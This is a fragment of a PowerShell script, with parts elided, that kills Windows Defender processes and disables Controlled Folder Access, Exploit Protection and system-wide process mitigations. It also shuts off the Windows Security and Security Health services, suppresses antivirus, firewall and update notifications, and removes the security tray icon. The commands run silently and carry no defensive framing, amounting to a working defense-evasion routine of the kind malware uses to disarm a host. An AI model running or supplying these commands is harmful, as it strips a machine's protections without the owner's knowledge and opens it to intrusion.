...
# ====================
Write-Host "[0/25] Killing all Defender processes..." -ForegroundColor Yellow
$defenderProcesses = @(
...
$null = reg.exe add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows Defender\Windows Defender Exploit Guard\Controlled Folder Access" /v "EnableControlledFolderAccess" /t REG_DWORD /d 0 /f 2>&1

# Disable all Exploit Protection
$null = reg.exe add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender Exploit Guard\Exploit Protection" /v "ExploitProtectionSettings" /t REG_SZ /d "" /f 2>&1

# Disable all mitigations
$null = reg.exe add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\*" /v "MitigationOptions" /t REG_QWORD /d 0 /f 2>&1
...
# Stop and disable Windows Security Service
...
$null = sc.exe config wscsvc start= disabled 2>&1

# Stop and disable Security Center
...
$null = sc.exe config SecurityHealthService start= disabled 2>&1

# Disable Security and Maintenance notifications
$null = reg.exe add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "HideSCAHealth" /t REG_DWORD /d 1 /f 2>&1

# Disable all security providers
$null = reg.exe add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Security Center" /v "AntiVirusDisableNotify" /t REG_DWORD /d 1 /f 2>&1
$null = reg.exe add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Security Center" /v "FirewallDisableNotify" /t REG_DWORD /d 1 /f 2>&1
$null = reg.exe add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Security Center" /v "UpdatesDisableNotify" /t REG_DWORD /d 1 /f 2>&1
$null = reg.exe add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Security Center" /v "AntiVirusOverride" /t REG_DWORD /d 1 /f 2>&1
$null = reg.exe add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Security Center" /v "FirewallOverride" /t REG_DWORD /d 1 /f 2>&1

# Kill Security Center tray icon
Get-Process -Name "SecurityHealthSystray" -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
$null = reg.exe add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "SecurityHealth" /t REG_SZ /d "" /f 2>&1
